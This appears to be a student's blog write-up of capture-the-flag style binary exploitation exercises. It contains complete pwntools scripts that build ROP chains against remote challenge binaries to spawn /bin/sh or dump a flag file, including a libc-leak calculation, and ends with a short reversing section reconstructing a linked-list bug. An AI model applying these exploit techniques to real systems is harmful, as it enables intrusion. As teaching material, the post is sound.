---
title: Pop Instructions Should be Illegal
date: "2020-07-19 19:10:31.582772"
description: "Using ROP technique to exploit binaries really makes you realize how amazing the 'pop' instruction is"
categories: ["code"]
---

# Pop Instructions Should be Illegal

_- Atharv Damle _

---

## swrop

---

FLAG{REDACTED}

---

Simple W(??) rop. For this one all we need is to redirect code execution, using a simple buffer overflow. Only difference is that there is no `win` function.

1. The `system` call is already in the `not_call` function
2. `/bin/sh` is in the data region for some reason.

With that in mind, we call `system`, putting the address to `/bin/sh` at the top of the stack.

```python
#!/usr/bin/python3

from pwn import *

#p = process('./swrop')
p = remote('plsdonthaq.me', 6001)

padding = b'a' * 0x88
binsh = p32(0x080485f0)
system = p32(0x080484ed)

p.sendline(padding + system + binsh)

p.interactive()
```

## static

---

FLAG{REDACTED}

---

Graduating from a single rop gadget, we move to larger rop chains. The goal in this one was to pop a shell.  
Since it is a statically compiled binary, we have a lot of rop gadgets to play with. While there is no `/bin/sh`, the pointer to the buffer we overflow is put loaded into `eax` after the call.

1. As the buffer is read in using fgets, we can simulate the string by putting `/bin/sh\x00` into the buffer. This way, the "string" in the buffer is only 8 bytes long.
2. Set the registers appropriately as:
   1. `eax = 0xb` ---> execve
   2. `ebx = <address of the buffer>` ---> `/bin/sh\x00`
   3. `ecx = 0`
   4. `edx = 0`
3. Run a syscall using `int 0x80`
4. `cat flag`

```python
#!/usr/bin/python3

from pwn import *

#p = process('./static')
p = remote('plsdonthaq.me', 6002)

#gdb.attach(p)

# put binsh at the front of the buffer
binsh = b'/bin/sh\x00'
padding = b'A' * 8

# set eax
eaxEdit = p32(0x08091f17)

# set ecx
ecxEdit = p32(0x0806b32c)
ecxEdit2 = p32(0x080c49cf)

# set edx
edxEdit1 = p32(0x080562ab)
edxEdit2 = p32(0x0809c216)
edxPadding = b'A'*12

# int 0x80
syscall = p32(0x08049533)

# mov ecx, eax
movEaxToEdi = p32(0x0806af9d)
movEdiToEdx = p32(0x0809c216)
movEdxToEbx = p32(0x0806d956)
movEdiToEdxPadding = b'A' * 12

p.sendline(binsh + padding + movEaxToEdi + movEdiToEdx + movEdiToEdxPadding + movEdxToEbx + ecxEdit + ecxEdit2 + edxEdit1 + edxEdit2 + edxPadding + eaxEdit + b'AAAA' + syscall)

p.interactive()
```

## roproprop

---

FLAG{REDACTED}

---

This one was very similar to the previous one, except it has PIE enabled, and is dynamically linked.

1. Dynamically linked, means that there aren't enough rop gadgets to easily make a chain.
2. PIE means that we need to calculate the actual addresses of the rop gadgets by offsetting them with the address of libc-base

Fortunately, we have a pointer into a libc leaked to us. Turns out, it points to the `setbuf` function. In that case, all we need is to calculate the start of libc by subtracting the offset to `setbuf` from it. Since the exact version of libc is provided, we can use that to get the offset of `setbuf` and calculate the value of libc-base. After that we can simply offset each of the rop gadgets found in libc with the libc base calculated at runtime and pop a shell using the method from static.

**Did I mention `pop` instructions are too amazing?**

```python
#!/usr/bin/python3

from pwn import *

# p = process('./roproprop')
p = remote('plsdonthaq.me', 6003)

# gdb.attach(p)

p.readuntil('- ')
libc_ptr = int(p.readuntil(' -', drop=True), 16)
libc_base = libc_ptr - 0x00065ff0

def getLibcAddress(offset):
	return p32(libc_base + offset)

padding = b'A' * 0x4ca
retPad = b'BBBB'

# pop ebx
binsh = getLibcAddress(0x0015ba0b)
rop1 = getLibcAddress(0x00018395)

# pop ecx; pop edx;
rop2 = getLibcAddress(0x0002bc6c)

# mov eax, 4
rop4 = getLibcAddress(0x000a05d0)

# add eax, 7
rop5 = getLibcAddress(0x0013fd0f)

# int 0x80
rop6 = getLibcAddress(0x00002c87)

p.sendline(padding + retPad
		+ rop1 + binsh + rop2 + p32(0) + p32(0) + rop4 + rop5 + rop6)

p.interactive()
```

## ropme

---

FLAG{REDACTED}

---

The final rop challenge.
I'm sure there's a way to run `puts(<puts@plt>)`, leaking libc, but unlike the previous challenges, I simply used the read and write syscalls to dump the flag instead of trying to pop a shell.

Interestingly, because of how the program works, the flag file is bound to be opened in the next available file descriptor: `3` (after `stdin`, `stdout` and `stderr`). Exploiting this fact, we can dump the `flag` file without a shell.

**Notes:**

1. What you want to be careful is not to put too many bytes into the stream, so you don't end up going beyond the possible number of bytes the program can take in before you crash it. The payload is fairly large, and the "buffer" rather small at only 8 bytes.
2. On the flip-side, you also need to remember that you're overwriting the buffer you're putting the rop chain in, so you need to make sure that the next rop instruction is not accidently overwritten. This probably won't happen because all the rop gadgets are 4 bytes long, whereas the instruction inside: `add edx, 1; ret;` only adds one byte the total number of characters to write.

```python
#!/usr/bin/python3

from pwn import *

#p = process('./ropme')
p = remote('plsdonthaq.me', 6004)

#gdb.attach(p)

# ecx is set

# mov edx, 0
zeroEdx = p32(0x080484ef)

# add edx, 1
addEdx = p32(0x080484fc)

# ebx
setEbx = zeroEdx + addEdx + p32(0x08048502)
setEbx2 = p32(0x08048420)

# mov eax, 3
setEax = zeroEdx + addEdx + addEdx + addEdx + p32(0x08048500)

# mov eax, 4
setEax2 = zeroEdx + addEdx + addEdx + addEdx + addEdx + p32(0x08048500)

# int 0x80
syscall = p32(0x080484f2)

# 8 bytes in the buffer + ebp
padding = b'A' * 12

p.sendline(padding + setEax + (addEdx * 100) + syscall + setEax2 + setEbx + (addEdx * 100) + syscall)

p.interactive()
```

## re.c

---

_Can't believe I was having difficulty introducing a bug_

This was an interesting reversing challenge. A first with IDA, hopefully the last. Why does it not have dark mode lol.

It was fun trying to recognize and understand the struct linked list pattern. The program loops until the counter is greater than 9, creating one node in the list on every iteration. There is a check to see if the `malloc` worked properly. What was particularly amusing is that the list is created backwards. So the linked list would look like `...E -> D -> C -> B -> A -> NULL` instead of the opposite (which is probably why Adam got confused with the NULL??). Arguably, you don't need the if statement in the loop, but I guess it adds to the challenge.
If I was confused about something it would be as to why the struct in memory looks like

> `<char: 1 byte> + <padding: 3 bytes> + <next pointer: 4 bytes>`

instead of

> `<next pointer: 4 bytes> + <char: 1 byte>`

but perhaps this gets removed when (and if) the binary is optimized.

```c
struct linkedList {
    char letter;
    struct linkedList *next;
};

struct linkedList * new() {
    int i = 0;
    struct linkedList *head;
    struct linkedList *tail = NULL;

    while (i <= 9) {
        head = malloc(sizeof(struct linkedList));
        if (head == NULL) {
            exit(1);
        }

        if (tail == NULL) {
            tail = head;
        }
        else {
            head -> next = tail;
            tail = head;
        }

        // Remove this line to fix the program lol
        head -> next = NULL;

        head -> letter = 'A' + i;
        i += 1;
    }

    return tail;
}
```

## Conclusion

---

Ropped
